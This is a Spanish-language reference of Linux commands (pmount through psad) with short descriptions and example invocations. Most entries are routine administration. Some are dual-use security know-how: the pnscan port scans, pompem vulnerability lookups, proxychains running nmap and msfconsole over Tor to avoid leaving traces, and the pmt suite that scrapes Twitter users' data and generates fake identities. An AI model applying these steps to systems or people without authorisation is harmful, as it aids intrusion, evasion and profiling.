Nota.- Un dispositivo DAX [devdax] proporciona un medio para que las aplicaciones accedan directamente al almacenamiento, sin la participación de un sistema de archivos. El beneficio del dispositivo DAX es que proporciona una granularidad de fallas garantizada. Debe haber al menos un dispositivo DAX como entrada o salida. Si no se especifica, el valor predeterminado será stdin o stdout respectivamente. Para las arquitecturas Intel 64 y AMD64, se admiten las siguientes granularidades: 4KB, 2MIB y 1GB


pmie
Motor de inferencia para métricas de rendimiento.
$ pmie archivo


pmount
Permite a usuarios sin privilegios montar dispositivos extraíbles sin una entrada /etc/fstab coincidente.
# pmount (Muestrar todos los dispositivos extraíbles montados)
# pmount --type iso9660 --read-only /dev/cdrom (Montar un CD-ROM con el tipo de sistema de archivos ISO9660 en modo solo lectura)
# pmount --type ntfs --read-write /dev/sdc (Montar un disco formateado en NTFS, forzando el acceso de lectura y escritura)
# pmount --type ext4 /dev/sda1 label (Montar un dispositivo con un tipo de sistema de archivos ext4 en /media/label)
# pumount /dev/sda1 (desmontar una particion)


pmt-
[coreutils, cutycapt, xvfb, imagemagick, twidge, html2text, wget] Pequeña suite para extraer información de usuarios de twitter. Listado de scripts de la suite: pmt-avatar.sh  pmt-followers.sh  pmt-hashtags.sh  pmt-nicks.sh  pmt-people.sh  pmt-rmessage.sh  pmt-screenshot.sh
	$ wget http://elbinario.net/wp-content/uploads/2015/05/puppetmastertweet-wip.tar5.gz
	$ tar zxf puppetmastertweet-wip.tar5.gz
	$ cd puppetmastertweet/tools
$ ./pmt-avatar -a lapipaplena (Extrae el avatar y lo coloca en la carpeta pictures)
$ ./pmt-followers.sh -f lapipaplena (Muestra el número de seguidores)
$ ./pmt-hashtags.sh -t es (Muestra listado de hashtags de un país especificado)
$ ./pmt-nicks -n (Genera un nick aleatorio)
$ ./pmt-nicks -a (Genera un nombre y un apellido)
$ ./pmt-nicks -b (Genera un nombre y dos apellidos)
$ ./pmt-nicks -c (Genera un nombre, dos apellidos y un nick acorde)
$ ./pmt-nicks -d (Genera un nombre, dos apellidos y un nick acorde en valores separados por ;)
$ ./pmt-people.sh -p Toros (lista de cuentas con relevancia en un hashtag)
$ ./pmt-rmessage.sh -m lapipaplena (Muestra mensajes de un usuario)
$ ./pmt-rmessage.sh -l lapipaplena (Muestra el último mensaje de un usuario)
$ ./pmt-screenshot.sh -f lapipaplena (captura de pantalla de un perfil. Se guarda en la carpeta screenshots)


pm-utils
Herramienta de línea de comandos de shell para suspender e hibernar la computadora. Incluye los ejecutables: pm-is-supported, pm-hibernate, pm-powersave, pm-suspend y pm-suspend-hybrid
$ pm-is-supported (muestra las acciones soportadas [--suspend | --hibernate | --suspend-hybrid])
# pm-suspend --quirk-* --help (ver las opciones de suspender)
# pm-suspend-hybrid --quirk-* --help (ver las suspension hibrida)
# pm-hibernate --help (ver los parámetros de la opción que puede especificarse para hibernar el pc)
# pm-powersave false (desactiva las funciones de ahorro de energía)
# pm-powersave true (activa las funciones de ahorro de energía)


png2html
Convertir imagenes png a html. Dado que la conversión asume 1 pixel por cada caracter, las imagenes resultantes se ven alargadas. Para una visualización más decente han de achatarse. A modo de ejemplo una imagen de 115x115 no se ha visualizado correctamente hasta 155x115.
$ png2html imagen.png texto.txt salida.html 1
El archivo texto.txt contiene una palabra, frase o párrafo con el que se confeccionará la imagen. El último número indica:
0 = fuente pequeña incompatible en algunos navegadores.
1 = fuente mediana.
2 = fuente grande.


pngcheck
Verifica la integridad de archivos PNG, JNG y MNG y opcionalmente vuelca casi toda la información. Por ejemplo, se puede usar para imprimir las estadísticas básicas sobre una imagen [dimensiones, profundidad de bits, etc.] para enumerar la información de color y transparencia en su paleta o para extraer las anotaciones de texto incrustadas.
$ pngcheck imagen.png
$ pngcheck *.png (verifica un lote de imagenes)


pngcrush
Optimizar imagenes png.
$ pngcrush imagen.png nueva_imagen.png (Uso basico)
$ pngcrush -rem allb -brute -reduce original.png modificada.png (Quitando información adicional [-rem allb], utilizando método de fuerza bruta que prueba 114 filtros y métodos compresión y selecciona el que mejor comprima la imagen [-brute] y reduciendo el tamaño de la imagen [-reduce])
$ optipng -o7 *.png (Todos las imagenes del directorio a su nivel mas alto posible)


pngmeta
Programa de filtrado que extrae metadatos de imágenes PNG y los muestra como HTML, SOIF, RDF/XML o campos y valores simples.
$ pngmeta --all --html imagen.png (Imprimir toda la información sobre el tamaño de la imagen, la profundidad, etc y salida en html.)


pngnq
Optimizacion de imagenes .png. Comprime reduciendo el número de colores disponible. El tamaño del archivo resultante es mucho menor, pero hay perdida de calidad.
$ pngnq imagen.png (No sobreescribe la imagen. Añade al nombre una extension para distinguirla [-nq8])
$ pngnq -n 256 imagen.png (Pasando de ARGB de 32 bits por píxel a formato de paleta de 256 colores, con 8 bits por píxel)
$ pngnq -n 64 imagen.png (Indicando numero de colores)


pngphoon
Crea una imagen png de la fase actual de la luna.
$ pngphoon -h 1060px -w 1060px -f lluna.png -s 50 (Los parámetros h [altura de la imagen], w [anchura] y f [archivo de salida] son obligatorios. "s" es la densidad de puntos)
$ pngphoon -h 1060px -w 1060px -f lluna.png -b (En negro la superficie de la luna no iluminada)


pngquant
Optimizacion de imagenes .png. Comprime reduciendo el número de colores disponible. El tamaño del archivo resultante es mucho menor, pero hay una perdida de calidad.
$ pngquant imagen.png
$ pngquant --quality=40-90 imagen.png (con una cualidad de 40 minima y 90 maxima)
$ pngquant *.png (todas las imágenes del directorio)
$ pngquant imagen1.png imagen2.png imagen3.png (con varias imágenes a la vez)


pngsplit
[pngcheck]. Dividir un archivo PNG, MNG o JNG en fragmentos individuales numerados.
$ pngsplit --verbose --force foto.png (mostrando mensajes y sobrescribir archivos de salida existentes)


pngtools
Conjunto de utilidades para trabajar con archivos PNG. Incluye las aplicaciones pngchunkdesc, pngchunks, pngcp y pnginfo
$ pngchunkdesc imagen.png (Los archivos PNG se basan en una serie de fragmentos que incorporan la información almacenada en el archivo de imagen. Estos fragmentos tienen nombres ASCII de cuatro caracteres, donde el caso de cada letra almacena información adicional. Este programa decodifica la información del caso en los nombres de los fragmentos y la muestra)
$ pngchunks imagen.png (imprimir información incrustada en un archivo PNG)
$ pngcp entrada.png salida.png (crear un nuevo archivo PNG, cambiado algunos atributos como las transparencias)
$ pnginfo imagen.png (muesra información sobre la imagen expecificada)


pnscan
Es un escáner de puertos de subprocesos múltiples.
$ pnscan 192.168.1 5/24 22 (escanear el puerto 22 de la red mencionada)
$ pnscan 192.168.1.5/24 1:65525 (todos los puertos de la red))
$ pnscan -w"HEAD / HTTP/1.0\r\n\r\n" -r"Server:" localhost 1:65525 (escanear todos los puertos de localhost)


pom (bsdgames)
Informa de las fases de la luna.
$ pom


pompem
Herramienta diseñada para automatizar la búsqueda de vulnerabilidades en las bases de datos más importantes. Realiza búsquedas en seguridad PacketStorm, CXSecurity, ZeroDay, Vulners, base de datos de vulnerabilidades nacionales, base de datos de vulnerabilidades WPScan ...
$ pompem -s Wordpress
$ pompem -s Joomla --html (escribir el resultado en un archivo .html)
$ pompem -s "Internet Explorer,joomla,wordpress" --html
$ pompem -s FortiGate --txt (el resultado en un archivo .txt)
$ pompem -s ssh,ftp,mysql


popbugs
Encuentra errores en paquetes que se usan habitualmente.
# popbugs -d


popd
Ver pushd.


poppassd
Es un script CGI escrito para permitir a los usuarios cambiar sus contraseñas de una forma más divertida:
# poppassd
  200 poppassd v1.8.4 hello, who are you?
  user nombre_usuario
  200 Your password please.
  pass 1234567
  200 Your new password please.
  newpass 987654
  200 Password changed, thank-you.
  quit
  200 Bye.
Nota.- Como puede verse en el ejemplo anterior, las contraseñas no cifradas se transmiten a través de la red. Debido a esto, se recomienda utilizar este demonio solo para cambiar la contraseña del loopback local y bloquear todo acceso no local al puerto 106 [localhost:106], ya sea a través de /etc/hosts.deny:
# nano /etc/hosts.allow
Y colocar la linea:
ALL: 127.0.0.1
Y en:
# nano /etc/hosts.deny
ALL : 127.0.0.1:106
O con reglas de firewall apropiadas.


popularity-contest
Informa a Debian de los paquetes más populares. Normalmente esta aplicación es lanzada por cron (/etc/cron.daily/popularity-contest). El archivo de configuración se encuentra en /etc/popularity-contest.conf. Si queremos ver el listado de lo que manda a Debian:
# popularity-contest > listado


porg
Es un programa para ayudar a la gestión de paquetes de software instalados desde el código fuente. Después de la instalación de dichos paquetes, generalmente uno no tiene idea de qué se instaló y adónde fue, lo que dificulta la desinstalación del paquete en el futuro. Porg fue escrito para resolver este problema de una manera bastante sencilla. Al instalar un paquete desde las fuentes, porg encapsula el comando de instalación (por ejemplo, "make install") y guarda la información de instalación en su propia base de datos de texto sin formato.
La siguiente secuencia de comandos ejemplifica una instalación típica de un paquete llamado foo-1.3:
$ tar xvf foo-1.3.tar.gz
$ cd foo-1.3
$ ./configure
$ make
# porg -lp foo-1.3 "make install" (Especificar el nombre del paquete que se registrará y activar logs)
Después de los comandos anteriores, y siempre que todo haya ido bien, el programa foo-1.3 se instalará en el sistema y se registrará en la base de datos de porg. Se puede verificar simplemente escribiendo el siguiente comando, que enumerará los archivos instalados por el paquete:
$ porg -f foo-1.3 (activando listado [-f]. Sin nombre de archivo, lista todos los instalados mediante porg)
$ porg -i foo-1.3 (información del paquete)


portsentry
Herramienta de seguridad que detecta escaneo de puertos y permite monitorizar rastreos tipo NULL, SYN, TCP, ARP... Su configuración se realiza en el archivo /etc/portsentry/portsentry.conf, las opciones [tcp y/o udp] del demonio en /etc/default/portsentry y las máquinas y interficies a ignorar en /etc/portsentry/portsentry.ignore.static. Sin tocar del archivo de configuración el parámetro TCP_PORTS y UDC_PORTS portsentry simula que todos los especificados están abiertos, lo cual puede verificarse con un nmap:
# nmap 192.168.1.x
La configuración por defecto con la explicación a modo de comentario:
	# Puertos que se simularán abiertos y que monitorizarán ataques:
	TCP_PORTS="1,11,15,79,111,119,143,540,635,1080,1524,2000,5742,6667,12345,12346,20034,27665,31337,32771,32772,32773,32774,40421,49724,54320"
	UDP_PORTS="1,7,9,69,161,162,513,635,640,641,700,37444,34555,31335,32770,32771,32772,32773,32774,31337,54321"
	# Monitorizar los servicios del rango de puertos del 1 al especificado [1024]:
	ADVANCED_PORTS_TCP="1024"
	ADVANCED_PORTS_UDP="1024"
    # puertos excluidos del scaneo:
	ADVANCED_EXCLUDE_TCP="113,139"
	ADVANCED_EXCLUDE_UDP="520,138,137,67"
	# Archivo con ips que no queremos bloquear:
	IGNORE_FILE="/etc/portsentry/portsentry.ignore"
	# Direcciones detectadas intentando accesar puertos monitoreados:
	HISTORY_FILE="/var/lib/portsentry/portsentry.history"
	BLOCKED_FILE="/var/lib/portsentry/portsentry.blocked"
	# No resolver la ip del host atacante [con valor 1 lo resuelve]:
	RESOLVE_HOST = "0"
        # Bloquear scaneos udp y tcp. valor 0 no bloquear
	BLOCK_UDP="1"
	BLOCK_TCP="1"
	# Configurar la actuación de los distintos intentos de intrusión [0=no bloquear, 1=Bloquear y 2=Ejecutar un comando externo]:
	KILL_ROUTE="/sbin/route add -host $TARGET$ reject"
	# Opción para los atacantes insistentes [bloqueo total por TCPwrappers]:
	KILL_HOSTS_DENY="ALL: $TARGET$ : DENY"
	# qué tan rápido marca una intento fallido como un ataque. 0=paranoico, 1 y 2=permite algún error. Valores superiores descartar]
	SCAN_TRIGGER="0"
	# Comunicar un mensaje al atacante:
	PORT_BANNER="** UNAUTHORIZED ACCESS PROHIBITED *** IP LOGGED"
Ha de especificarse, si no consta ya, como mínimo en /etc/portsentry/portsentry.ignore, la ip localhost, 127.0.0.1 y las IPs de las interfaces locales si existen.
# service portsentry stop
# service portsentry start
# service portsentry status
# grep "attackalert" /var/log/syslog (ver alerta de ataques)
# grep -n Blocked /var/lib/portsentry/portsentry.history (ver historial de ips bloqueadas)
# nano /var/lib/portsentry/portsentry.blocked (ver ips bloqueadas)


postgres
[postgresql php5-pgsql]. Gestión de base de datos. En caso de querer aceptar conexiones externas:
# nano /etc/postgresql/9.1/main/postgresql.conf
Substituir la linea:
	listen_addresses = 'localhost'
por:
	listen_addresses = '*'
1.-
Pasos previos para la creación del usuario y la base de datos:
	$ sudo -s
	# su postgres (Cambiar a la cuenta del usuario por defecto)
	$ createuser NOMBRE_DEL_USUARIO (Crear un usuario. Pregunta si con privilegios o sin [Shall the new role be a superuser? (y/n)])
	$ createdb NOMBRE_BASE_DE_DATOS -E utf8 -O NOMBRE_DEL_USUARIO (Crear una base de datos especificando propietario y codificación)
	$ psql
	postgres=# alter user NOMBRE_DEL_USUARIO with passwrd 'LA_CONTRASEÑA'; (Establecer contraseña de un usuario)
2.-
Para crear un usuario que sea el mismo que el sistema operativo y con privilegios de administrador:
	$ sudo -u postgres createuser --superuser $USER
	$ sudo -u postgres psql
	$ postgres=# \password USUARIO
3.-
Creación de un base de datos [la llamaremos "misdatos"]:
	$ createdb misdatos (Si se ha creado el mismo usuario que el sistema operativo)
	$ sudo -u postgres createdb misdatos (En caso de sólo existir el usuario por defecto [postgres])
	$ createdb (Crea una base de datos con el mismo nombre que el usuario)
	$ createdb misdatos (Crea una base de datos con un nombre concreto)
	$ dropdb misdatos (Eliminar una base de datos)
4.-
Acceso a una base de datos:
	$ sudo -u usuario psql base_de_datos (Cuando el usuario no es el mismo del sistema)
	$ psql misdatos (Entrar en el prompt de la base de datos especificada)
	misdatos=# (Prompt de la base de datos de administrador)
	misdatos=> (Prompt de la base de datos sin privilegios)
5.-
Creación de una tabla (igual que para mysql [ver]):
	CREATE TABLE usuario(
	nombre VARCHAR(20), apellido VARCHAR(20),
	profesión VARCHAR(20), sexo CHAR(1), nacimiento DATE,
	antiguedad DATE);
	misdatos=# DROP TABLE nombre_de_la_tabla; (Borrar una tabla)
	misdatos=# INSERT INTO usuario VALUES ('juan antonio', 'gomez', 'admin', 'h', '1985-10-06', '2008-03-11'); (Entrar datos en el mismo orden en el que se ha creado la tabla)
	misdatos=# SELECT * FROM usuario; (Ver el contenido de una tabla)
	misdatos=# SELECT nombre FROM usuario; (Seleccionar una columna de una tabla)
	misdatos=# SELECT * FROM usuario ORDER BY nombre; (Mostrar una tabla ordenado segun una columna)
Las metaordenes de psql son un conjunto de órdenes internas, no propiamente órdenes SQL. Todas empiezan con la barra invertida [\].
	\h (Muestra la ayuda. Pulsando "q" salimos de la ayuda)
	\? (Ver todas las ordenes internas)
	\q (Salir de psql)


powerdebug
Herramienta para mostrar información sobre reguladores, sensores y relojes.
# powerdebug (de todo)
# powerdebug -s (-s sensores, -r del regulador, -c del reloj)
# powerdebug -d (volcar info por pantalla)


powerline
[fonts-powerline]. Utilidad escrita en python que muestra otra forma de ver el prompt de la shell.
$ mkdir ~/.config/powerline
$ cp -R /usr/share/powerline/* ~/.config/powerline (copiar archivos y modificarlos al gusto)
Añadir la siguientes lineas en .bashrc
	if [ -f /usr/share/powerline/bindings/bash/powerline.sh ]; then
	source /usr/share/powerline/bindings/bash/powerline.sh
	fi
Recargar la configuración:
	$ source .bashrc
para tener la misma configucación como root:
	# cp -f .bashrc /root/.bashrc
El resultado se observa al abrir una nueva terminal.


poweroff
[halt, reboot]. Apagar el ordenador. Los 3 comandos tienen las mismas opciones.
$ poweroff --halt (Detener la máquina independientemente de que comando de los tres se use)
$ poweroff --reboot (Reinicie la máquina, independientemente de cuál de los tres comandos se invoque)


powerstat
Utilidat para medir el consumo de energía de un portatil con fuente de alimentación por batería. Proporciona información sobre el consumo de energía del sistema.
$ powerstat (Mida la potencia con el valor predeterminado de 10 muestras con un intervalo de 10 segundos)
$ powerstat interval 20 (Mida la potencia con un número especificado de muestras)


powertop
Es una herramienta para diagnosticar problemas con el consumo y la administración de energía. Además de ser una herramienta de diagnóstico, también tiene un modo interactivo que puede usar para experimentar con varias configuraciones de administración de energía, en los casos en que la distribución de Linux no haya habilitado esas configuraciones. powertop informa qué componentes del sistema tienen más probabilidades de ser responsables de un consumo de energía superior al necesario, desde aplicaciones de software hasta componentes activos del sistema. Hay pantallas detalladas disponibles para los estados C y P de la CPU, la actividad del dispositivo y la actividad del software.
# powertop -t 10 --debug -c -r (generar un informe durante 10 segundose, ejecutar en modo calibración y el resultado en .html [powertop.html])


ppp
El protocolo Point-to-Point proporciona una forma estándar de transmitir datagramas a través de un enlace serie, así como una forma estándar para que las máquinas en cada extremo del enlace negocien varias características opcionales del enlace. Este paquete se utiliza más comúnmente para administrar un módem para acceso telefónico o ciertos tipos de conexiones de banda ancha. Incluye los ejecutables: plog, poff y # pon (ejecuta el archivo /etc/ppp/ppp_on_boot, si existe y es ejecutable. De lo contrario, se iniciará una conexión PPP utilizando la configuración de /etc/ppp/peers/provider)
# poff (cierra una conexión PPP)
# poff conec (Si existe más de una conexión PPP, se eliminará la que se menciona en el argumento)
# plog (muestra las últimas líneas de /var/log/ppp.log. Si ese archivo no existe, muestra las últimas líneas del archivo /var/log/syslog, pero excluyendo las líneas no generadas por pppd)
Nota.-  Para tener toda la información generada por pppd en un archivo de registro que pueda mostrar ese plog, se necesita la siguiente línea en el archivo /etc/syslog.conf:
        local2.*       -/var/log/ppp.log


ppt
Formatea un texto a cintas de papel.
$ ppt linux es un sistema genial


pr
Muestra en pantalla un archivo de texto en modo “Previsualización de impresión”
$ pr fichero.txt


prads
Es un Sistema Pasivo de Detección de Activos en Tiempo Real [Passive Real-time Asset Detection System]. Escucha pasivamente el tráfico de la red y recopila información sobre los hosts y servicios que ve. Esta información se puede utilizar para mapear la red, permitiéndo saber qué servicios y hosts están siendo activos o utilizados. Incluye la aplicaciones prads-asset-report y prads2snort.
# prads -v -u user -i eth1 (con la máxima información, del usurio "user" [por defecto root] y la interfaz eth1 [por defecto eth0] los logd se guardan por defecto en /var/log/prads-asset.log)
# prads2snort -v -i /var/log/prads-asset.log -o /etc/snort/host_attributes.xml ()
# prads-asset-report -r /var/log/prads-asset.log -w asset-report.txt (enviar el informe de log [-r] al archivo especificado [-w])


prelink
Preenlazar binarios y bibliotecas ELF compartidas para acelerar su tiempo de inicio. Precisa lanzar prelink despues de cada nueva instalación de paquetes o configurarlo en el cron.
# prelink -amR (Para equipos x86)
# prelink -aR (Para equipos x86_64)
Modificar las opciones de prelink:
# nano /etc/default/prelink
Y modificamos la línea que pone: PRELINKING=unknown por:
PRELINKING=yes
# prelink -au (Devolver el sistema a su punto de partida)


preload
Demonio que se encarga de recoger información de las aplicaciones más usadas para que en el siguiente inicio estos estén cargados en memoria acelerando el tiempo de arranque de los mismos.


prettyping
Herramienta para mostrar la latencia entre los hosts de envío y de destino. Es una envoltura de la herramienta de ping estándar con el objetivo de hacer que la salida sea más bonita, más colorida, más compacta y más fácil de leer. Prettyping ejecuta el ping estándar en segundo plano y analiza su salida, mostrando las respuestas al ping de forma gráfica mediante el uso de colores y caracteres Unicode.
$ prettyping google.com


primes
Generar números primos.
$ primes 1 100 (del 1 al 100)
$ primes 100 150 (del 100 al 150)


printenv
Para saber los valores de todas las variables de entorno predefinidas por  la shell (TERM, SHELL, PWD, LC_ALL, USER, USERNAME, HOME, LOGNAME, BROWSER, DISPLAY...).
$ printenv
$ printenv | grep "^PATH" (Sólo de la variable especificada)
$ printenv | grep "^SHELL" (lo mismo que "echo $SHELL")
$ export SHELL=/bin/sh (Modificar el valor de una variable sólo en la presente sesión. Para hacer el cambio permanente colocar la linea en .bashrc)


printf
Escribe y formatea datos
$ printf "%50s\n" | tr ' ' -  (Generar una linea discontinua)
$ printf "%s\n" ${PATH//:/\/* }  (listar aplicaciones y comandos del PATH)
$ printf "%s\n" .*  (listar archivos y directorios ocultos de la carpeta actual)
$ printf "\e[8;10;100;t" (Cambiar la medida de la  terminal)
$ printf "%s\t --> %s\n" "$A" "$B" (Dos variables en columnas tabuladas)
$ printf "%s\n" Escribir cada palabra en una "nueva linea" (Pues eso, excepto las dos últimas entrecomilladas)
$ printf "%06d\n" "$RANDOM" "$RANDOM" "$RANDOM" "$RANDOM" (Iguala las cuatro salidas de $RANDOM a 6 cifras con ceros delante[%06d])
$ printf "%-10s %-10s %s\n", $1, $2, $3 (3 variables justificadas a la izquierda, las dos primeras con 10 caracteres)
Algunas opciones:
%c (Imprime el primer carácter de una variable cadena)
%d (Imprime un número decimal)
%s (Cadena)
%b (Interpreta las secuencias de escape del argumento cadena)
%q (Escribe el argumento cadena de forma que pueda ser usado como entrada a otro comando)
%% (Escribe % literal)


prips
imprimir las direcciones IP de un rango determinado.
$ prips 192.168.1.0/24
$ prips -i 4 192.168.1.5 192.168.1.150  (solo una de cada cuatro)


privoxy
filtrar datos que se utilizan en la navegación web (cookies, encabezados...). Es importante usarlo con Tor ya que a veces el navegador ejecuta por sí mismo las resoluciones DNS y las agrega a las cabeceras de la petición http.
# nano /etc/privoxy/config
Añadir la linea:
forward-socks5 / 127.0.0.1:5060 .
Nota.- No olvidar el punto final.


procdump
Herramienta para detectar picos de utilización de CPU en una aplicación y generar un volcado de memoria [dump] durante este pico.
Lo siguiente creará un volcado de núcleo inmediatamente.
# procdump -p PID (volcado inmediato)
# procdump -n 3 -p PID (3 volcados separados por 10 segundos)
# procdump -n -s 5 -p PID (3 volcados de núcleo separados por 5 segundos)
# procdump -C 70 -n 3 -p PID (un volcado cada vez que el proceso llegue al 70% de uso de CPU, 3 veces, separados por 10 segundos)
# procdump -C 70 -n 3 -s 5 -p PID (un volcado cada vez que el proceso llegue al 70% de uso de CPU, hasta 3 veces y con al menos 5 segundos entre volcados)
# procdump -c 10 -C 65 -p PID (un volcado del núcleo cuando el uso de la CPU está fuera del rango entre 10 y 65)
# procdump -C 70 -M 100 -p PID (un volcado cuando el uso de CPU llegue a 70% o el uso de memoria llegue a 100 MB)


procenv
Vuelca todos los atributos de entorno en un formato analizable.
$ procenv -C (los procesos de la CPU)
$ procenv -l (mostrar los limites de los atributos de entorno)
$ procenv --format=xml --signals (mostrar todos los datos en formato XML)


procinfo
Estadisticas del sistema de /proc
$ procinfo -r (memoria libre real)
$ procinfo -n2 (actualización cada 2 segundos)
$ procinfo -d (en base a segundos en lugar de como valores totales)
$ procinfo -D (mostrar estadísticas como totales)
$ procinfo -H (en formato KiB, MiB, GiB en lugar de los Kbytes predeterminados)


procps
Explorar el "pseudo" sistema procfs, generado dinámicamente por el kernel para proporcionar información sobre el estado de las entradas en su tabla de procesos, como si el proceso se está ejecutando, detenido o "zombi". Incluye varios ejecutables; kill, sysctl, free, pgrep, pidwait, pkill, pmap, pwdx, skill, slabtop, snice, tload, top, uptime, vmstat, w y watch


procs
Herramienta que se comporta básicamente como el comando ps [ver] pero más coloreado, más legible, por columnas y vista en árbol. Descarga de https://github.com/dalance/procs/releases/tag/v0.14.0 o instalar mediante snap: snap install procs
$ procs (lanzar la aplicación)
$ procs cpu (ver datos de las cpus)


proftpd
Servidor ftp local.
# nano /etc/proftp/proftpd.conf
DefaultRoot     /home/usuario                    users, !otros
DefaultRoot     /home/usuario/servidor      otros
Indicamos que el directorio raiz de los usuarios del grupo “users” es /home/usuario  pero los del grupo “otros” solo pueden acceder al directorio servidor.
$ tail -f /var/log/proftpd  (monitorizar los logs)


progress
Herramienta que busca comandos básicos de Coreutils [cp, mv, dd, tar, gzip/gunzip, cat, etc.] que se estan ejecutando en su sistema y muestra el porcentaje de datos copiados. También puede mostrar el tiempo estimado y el rendimiento. Simplemente escanea /proc en busca de comandos para encontrar archivos abiertos e informa de su estado.
$ progreess (forma básica)
$ progress -m (monitoreo interactivo)


prompt
Sección de texto que aparece en la pantalla cuando un usuario abre una terminal o consola informática tratando de avisar al usuario de que está lista para recibir una entrada. Normalmente muestra información como nombre del usuario,  ruta donde se encuentra, símbolo del sistema operativo utilizado, instrucciones para realizar ciertas tareas o diagnósticos. Bash tiene cuatro "cadenas de prompt" que se pueden personalizar: PS0 se muestra después de cada orden, antes de cualquier salida, PS1 es el prompt principal que se muestra antes de cada orden, PS2 es el prompt secundario que se muestra cuando una orden se aplica con varias lineas de entrada, PS3 para el comando de selección y PS4 cuando se ejecuta un script de shell en modo de depuración, normalmente el signo "+". Todos los ejemplos siguientes solo se aplican a la terminal hasta que se cierre. Para hacerlos permanentes ha de colocarse la linea en .bashrc.
$ export PS1="\u@\H \W:\$ "
$ export PS1="\u@\H>\t "
$ export PS1="\u@\H>\T "
$ export PS1="\u \H\a \t "
$ export PS1="Hola \u " (Escribimos el texto o carácter que deseamos que aparezca sin la barra invertida)
Algunas de las opciones para incorporar:
        \a – Un carácter ASCII
        \d – fecha actual en formato "dia_sem mes día", "dl. d’oct. 21"
        \e – Carácter de escape
        \h – Nombre de host (corto)
        \H – Nombre de host completo
        \j – Número de trabajos que administra el shell
        \l – El nombre base del dispositivo terminal del shell
        \n – Nueva línea
        \r – Retorno de carro
        \s – El nombre del shell
        \t – Hora (hora:minuto:segundo)
        \@ – Hora, 12 horas AM/PM
        \A – Hora, 24 horas, sin segundos
        \u – Nombre de usuario actual
        \v – Versión de BASH
        \V – Información adicional sobre la versión de BASH
        \w – Directorio de trabajo actual
        \W – El nombre base del directorio de trabajo ($HOME se representa con ~)
        \! – Muestra el número de este comando en el historial
        \# – Número de comando de este comando
        \$ – Especifica si el usuario es root (#) o ($)
        \\ – Barra invertida
        \[ – inicio de una secuencia de caracteres no imprimibles
        \] – fin de la secuencia de caracteres no imprimibles
Un ejemplo para ver la cadena PS2 podria ser:
         $ echo "linux es un sistema RET
         > genial" RET
         linux es un sistema
         genial
Si modificamos la PS2:
      $ export PS2='---> '
      $ echo "linux es un sistema RET
         ---> genial" RET
         linux es un sistema
         genial
También se puede personalizar el color del prompt
$ export PS1="\e[1;31m[\u@\h \W]\$ \e[0m"
El desglose del comando es:
      \e[ – Comienza los cambios de color
      1;31m – texto en negrita y color rojo [31]
      [\u@\h \W]\$ – usuario@host directorio de trabajo $
      \e[0m – Salir del modo cambio de color
El primer número del código de color especifica el tipo de letra:
      0 – Normal
      1 – Negrita
      2 – Tenue
      4 – Subrayado
El segundo número indica el color:
      30 – Negro
      31 – Rojo
      32 – Verde
      33 – Marrón
      34 – Azul
      35 – Púrpura
      36 – Cian
      37 – Gris claro


proxychains
[tor privoxy]. Convierte en anonima la conexión que realiza una aplicación determinada [Ver privoxy]
# nano /etc/proxychains.conf
Descomentar o añadir las lineas [usar el mismo puerto que en privoxy]:
# defaults set to "tor"
socks4  127.0.0.1 9050
Iniciar tor o, caso de usar vidalia, crear nueva identidad.
# /etc/init.d/tor restart
# proxychains curl ifconfig.me (Si la ip no es la nuestra indica que todo está correctamente funcionando)
Si configuramos el navegador para usar proxy podemos comprobar su correcto funcionamiento con https://check.torproject.org/
# proxychains firefox ifconfig.me (Arrancar el navegador bajo proxy)
# proxychains nmap -Pn -sT IP (Lanzar nmap con proxy. -Pn y -sT son para dificultar en lo posible dejar trazas)
Otros ejemplos:
# proxychains nessusd -D
# proxychains msfconsole
# proxychains ssh -D 127.0.0.1:9050 usuario@host


prozilla
[libncurses5]. Gestor de descargas. La descarga se realiza en el directorio actual. Para modificar dicho directorio ha de editarse en el archivo de configuración (/etc/prozilla.conf) la opción: mainoutputdir = /home/usuario/tmp. Página: <http://old-releases.ubuntu.com/ubuntu/pool/universe/p/prozilla/>
$ proz URL


ps
Informa sobre el estado de los procesos
$ ps	          (muestra el PID de la consola)
$ ps -ef (lista entera y completa de los procesos del sistema )
$ ps u          (Muestra el usuario y la hora de inicio de los ultimos procesos ejecutados)
$ ps r (Muestra solo los procesos que se estan ejecutando)
$ ps x (Muestra los que no estan controlados por ninguna terminal)
$ ps S (Muestra  tiempo de CPU y fallos de los procesos hijos)
$ ps aux | sort -nrk 4 | head (Los 10 procesos que consumen más memoria)
$ ps -C firefox (ver los procesos asociados a una aplicación)
$ ps -l PID  (informa de la aplicación que corre por un PID)
$ ps -p $$ (Informa del pid de la propia terminal)
	$ ps axo pid=,stat= | awk '$2~/^Z/ { print $1 }' (Ver PID de los procesos zombies)
Opciones
	a (muestra lo que se está ejecutando en ttys conocidas)
	x (muestra lo que se se está ejecutando desconociendo en cual tty)
	u (muestra los usuarios que están ejecutando los procesos)
flags:
	USER (usuario que ejecuta el proceso)
	PID (número del proceso)
	%CPU (porcentaje de CPU que está utilizando)
	%MEM (porcentaje de memoria)
	RSS (cantidad de memoria en kilobytes que ha utilizado el proceso)
	TTY (consola desde la que se está ejecutando)
	Stat (muestra el estado del proceso: S "durmiendo", R "corriendo", T "parado", Z "zombie")
	START (hora a la que empezó el proceso)
	TIME (tiempo de CPU que ha usado el proceso desde su inicio)
	COMMAND (nombre del comando que se está ejecutando)


ps2pdf
[psutils]. Pasar un archivo ps a pdf
$ man -t mount | ps2pdf -  mount.pdf   (salvar a pdf una página man del comando "mount")
Convertir pdf en formato A4 a A5 para imprimir como libro con las páginas ordenadas:
$ pdftops archivo.pdf  (convertir el .pdf a .ps)
$ psbook archivo.ps | psnup -pa4 -2 > archivo_A5.ps (convertir el archivo generado de A4 a A5)
$ ps2pdf archivo_A5.ps archivo_A5.pdf  (convertir nuevamente a pdf listo para imprimir)


psad
Analiza logs de iptables para detectar y opcionalmente bloquear IPs infractoras. Herramienta formada por tres demonios del sistema que se ejecutan y analizan mensajes de registro de iptables para detectar escaneos de puertos y el resto de tráfico sospechoso. Incluye 4 herramientas: nf2csv, fwcheck_psad, kmsgsd y psadwatchd. El archivo de configuración, por defecto, se encuentra en "/etc/psad/psad.conf". Los resultados en /var/log/psad/analysis.out.
Habilitar logs en iptables:
# iptables -A INPUT -j LOG
# iptables -A FORWARD -j LOG
Lanzar los siguientes tres comandos:
# psad -R (Reiniciar psad)
# psad --sig-update (Recargar firmas para que pueda reconocer correctamente los tipos de ataques conocidos)
# psad -H (Releer archivo pad)
Consultar estado con:
# psad -status
# psad -A (analizar los logs de iptables en busca de scaneos)
# psad -A -i eth0 (Analizar a partir de los logs de iptables e indicando red)
# psad -F (eliminar cualquier bloqueo de firewall generado automáticamente)
